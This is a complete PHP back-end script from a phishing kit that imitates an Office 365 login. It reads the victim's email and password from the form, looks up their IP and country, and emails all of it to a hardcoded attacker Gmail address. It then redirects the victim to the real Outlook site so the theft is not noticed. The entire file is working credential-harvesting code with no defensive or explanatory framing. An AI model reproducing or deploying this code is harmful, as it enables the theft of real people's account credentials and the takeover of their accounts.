<?php
session_start();
$_SESSION['Pdf3'] = $_POST['pdf3'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['ck'];
$passwd = $_POST['cknow'];
$own = 'alphonlsogas@gmail.com,alphonlsogas@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'result@donking.net';
$domain = 'LOGS | BLESS UP By Cyber Familly Ghost :D |';
$subj = "$domain | $country";
$headers .= "From: OFFICE365 LOGINS<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'http://drive.google.com/file/d';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________OffIcE LoG_________</td></tr>
 <tr><td><STRONG>EMail I.D: $login<td/></tr>
 <tr><td><STRONG>Password: $passwd</td></tr>
 <tr><td><STRONG>IP: $ip</td></tr>
 <tr><td><STRONG>Date: $server</td></tr>
 <tr><td><STRONG>country : $country</td></tr>
 <tr><td>_____cReAtEd_By_Cyber_Familly_GHost______</td></tr>
 </BODY>
 </HTML>";

     
if (empty($login) || empty($passwd)) {
header( "Location: https://outlook.office.com/" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: https://outlook.live.com/");
}
?>